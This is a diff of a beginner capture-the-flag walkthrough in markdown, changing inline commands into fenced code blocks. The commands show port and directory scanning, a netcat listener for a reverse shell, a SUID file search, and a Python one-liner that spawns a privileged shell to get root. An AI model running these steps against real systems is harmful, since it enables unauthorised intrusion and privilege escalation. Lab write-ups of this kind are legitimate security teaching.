@@ -6,7 +6,9 @@ A CTF for beginners, can you root me?
 
 Set up environment IP as IP_Machine
 
-`export IP=10.10.234.161`
+```
+export IP=10.10.234.161
+```
 
 ![task1-IP](./images/task1-IP.png)
 
@@ -14,7 +16,9 @@ Set up environment IP as IP_Machine
 
 * Scan the machine, how many ports are open?
 	
-	`nmap -sV $IP | tee -a nmap-default.txt`
+	```
+	nmap -sV $IP | tee -a nmap-default.txt
+	```
 
 	File scan resulted [here](./files/nmap-default.txt)
 
@@ -30,7 +34,9 @@ Set up environment IP as IP_Machine
 
 * Find directories on the web server using the GoBuster tool. What is the hidden directory?
 	
-	`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $IP | tee -a gobuster-default.txt`
+	```
+	gobuster dir -w /usr/share/wordlists/dirb/common.txt -u $IP | tee -a gobuster-default.txt
+	```
 
 	File scan resulted [here](./files/gobuster-default.txt)
 
@@ -47,7 +53,9 @@ Set up environment IP as IP_Machine
 
 	* Open terminal for netcat listening
 	
-		`nc -nvlp 8888`
+		```
+		nc -nvlp 8888
+		```
 
 		![task3-nc](./images/task3-nc.png)
 
@@ -67,13 +75,17 @@ Set up environment IP as IP_Machine
 
 * Search for files with SUID permission, which file is weird? 
 
-	`find / -type f -perm -4000 -ls 2>/dev/null`
+	```
+	find / -type f -perm -4000 -ls 2>/dev/null
+	```
 
 	![task4-find](./images/task4-find.png)
 
 * root.txt
 
-	`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+	```
+	/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+	```
 
 	![task4-root-txt](./images/task4-root-txt.png)
 
